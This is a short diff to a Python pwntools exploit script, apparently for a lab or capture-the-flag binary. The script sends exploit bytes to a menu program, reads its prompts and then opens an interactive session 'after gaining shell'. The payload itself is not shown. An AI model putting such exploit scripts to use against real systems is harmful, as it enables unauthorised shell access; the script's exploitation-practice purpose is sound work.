@@ -47,12 +47,12 @@ print(getData)
 
 # Send exploit bytes
 p.send(payload)
-"""
+
 # Read prompt
 getChoice = p.recvuntil("Choice: ")
 print(getChoice)
 #print("\n")
-"""
+
 """
 # Send option to search
 p.send(b"AA")
@@ -62,9 +62,9 @@ getChoice = p.recvuntil("Enter search term: ")
 print(getChoice)
 #print("\n")
 """
-"""
+
 # Send option to exit
 p.sendline(b'3')
-"""
+
 # Switch to interactive after gaining shell
 p.interactive()
